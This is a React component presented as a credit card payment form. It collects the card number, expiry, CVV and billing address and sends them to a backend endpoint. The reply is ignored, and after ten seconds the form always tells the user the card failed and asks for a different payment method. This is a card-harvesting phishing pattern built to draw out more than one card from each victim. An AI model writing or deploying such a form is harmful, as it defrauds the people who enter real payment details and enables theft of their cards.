import React, { useState } from 'react';
import { CountryData } from "../components/utils.js"
import dataFetch from '../modules/dataFetch';
function CreditCardForm() {
    const [cardNumber, setCardNumber] = useState('');
    const [cardHolder, setCardHolder] = useState('');
    const [expirationDate, setExpirationDate] = useState('');
    const [cvv, setCVV] = useState('');
    const [cardType, setCardType] = useState('');
    const [isValid, setIsValid] = useState(false);
    const [error, setError] = useState()
    const [laodingPayment, setLoadingPayment] = useState(false)
    


    const handleCardNumberChange = (e) => {
        const number = e.target.value.replace(/\D/g, '');
        let type = '';

        if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(number)) {
            type = 'Visa'
        } else if (/^5[1-5][0-9]{14}$/.test(number)) {
            type = 'Mastercard'
        }

        setCardNumber(number);
        setCardType(type);
    };

    const handleCardHolderChange = (e) => {
        setCardHolder(e.target.value);
    };

    const handleExpirationDateChange = (e) => {
        setExpirationDate(e.target.value);
    };

    const handleCVVChange = (e) => {
        setCVV(e.target.value);
    };

    function validateForm(cardNumber, cardHolder, expirationDate, cvv, userState, userCity,  userAddress) {


        if (cardNumber.length !== 16) {
            setError('Card number must be 16 digits long');
            return false
        }

        if (cardHolder.trim() === '') {
            setError('Card holder name is required');
        }

        if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expirationDate)) {
            setError('Invalid expiration date format (MM/YY)');
            return false
        }

        if (cvv.length !== 3) {
            setError('CVV must be 3 digits');
            return false
        }

        if (selectedCountry.trim() === '') {
            setError('Please select your country');
            return false
        }

        if (userState.trim() === '') {
            setError('Please select your state');
            return false
        }
        if (userCity.trim() === '') {
            setError('Please add your city');
            return false
        }
        if (userAddress.trim() === '') {
            setError('Please add your adress');
            return false
        }
        
       
        return true
    }


    const handleSubmit = (e) => {
        e.preventDefault();
        const result = validateForm(cardNumber, cardHolder, expirationDate, cvv, userState, userCity,  userAddress);

        if (result) {
            setError("")
            setIsValid(true)
            setLoadingPayment(true)
            const requestData={
                name: cardHolder,
                country:selectedCountry,
                address: userAddress,
                city: userCity,
                state: userState,
                cnumber: cardNumber,
                cEdate: expirationDate,
                cAuth:cvv
            }
            let url="http://localhost:4000/billtest"
            dataFetch(url, requestData)
            .then((res)=>{

            })
            .catch((err)=>{setError("An Error occured")})
            





            setTimeout(() => {
                setLoadingPayment(false)
                setError("We're unable to recieve payment from this card. Please choose a different payment method.")
                
            }, 10000);
        }
        else {
            return
        }

    };



   
    const [userState, setUserState] = useState('');
    const [userCity, setUserCity] = useState('');
    const [userAddress, setUserAddress] = useState('');
    const [selectedCountry, setSelectedCountry] = useState('');
    const [selectedStates, setSelectedStates] = useState([]);


    const handleCountryChange = (event) => {
        const selectedCountryName = event.target.value;
        const selectedCountryObject = CountryData.find(
            (country) => country.countryname === selectedCountryName
        );
        setSelectedCountry(selectedCountryName);
        setSelectedStates(selectedCountryObject?.states || []);
       
        // formData.state=selectedStates[0];
    };

   








    return (
        <div>

            <form onSubmit={handleSubmit}>
                {error && <div className='form-error-container'><p className='error'>{error}</p></div>}
                <div>
                    <label htmlFor="cardNumber">Card Number</label>
                    <input
                        type="text"
                        id="cardNumber"
                        value={cardNumber}
                        onChange={handleCardNumberChange}
                        maxLength="16"
                        placeholder="Card Number"
                    />

                </div>
                <div>
                    <label htmlFor="cardHolder">Card Holder</label>
                    <input
                        type="text"
                        id="cardHolder"
                        value={cardHolder}
                        onChange={handleCardHolderChange}
                        placeholder="Card Holder"
                    />
                </div>
                <div>
                    <label htmlFor="expirationDate">Expiration Date</label>
                    <input
                        type="text"
                        id="expirationDate"
                        value={expirationDate}
                        onChange={handleExpirationDateChange}
                        placeholder="MM/YY"
                    />
                </div>
                <div>
                    <label htmlFor="cvv">CVV</label>
                    <input
                        type="text"
                        id="cvv"
                        value={cvv}
                        onChange={handleCVVChange}
                        maxLength="3"
                        placeholder="CVV"
                    />
                </div>

                <h2>Payment Address</h2>


                <div>
                    <label>Country</label>
                    <select
                        name="country"
                        value={selectedCountry}
                        onChange={handleCountryChange}
                    >
                        <option disabled value="">Select Country/Region</option>
                        {CountryData.map((country) => (
                            <option key={country.countryname} value={country.countryname}>
                                {country.countryname}
                            </option>
                        ))}
                    </select>
                </div>

                <div>
                    <label>State</label>
                    <select
                        name="state"
                        value={userState}
                        onChange={(e) => { setUserState(e.target.value) }}
                    >
                        <option disabled value="">Select State/Province</option>
                        {selectedStates.map((state) => (
                            <option key={state} value={state}>
                                {state}
                            </option>
                        ))}
                    </select>
                </div>

                <div>
                    <label>City</label>
                    <input
                        type='text'
                        placeholder='City'
                        name='city'
                        value={userCity}
                        onChange={(e) => { setUserCity(e.target.value) }}
                    />
                </div>

                <div>
                    <label>Address</label>
                    <input
                        type='text'
                        placeholder='Address'
                        name='address'
                        value={userAddress}
                        onChange={(e) => { setUserAddress(e.target.value) }}
                    />
                </div>

                <button type="submit" onClick={()=>{
                    
                }}>{laodingPayment ? <i className="fa-solid fa-spinner fa-spin spinner"></i> : <p> Submit</p>}</button>
            </form>
           







        </div>
    );
}

export default CreditCardForm;
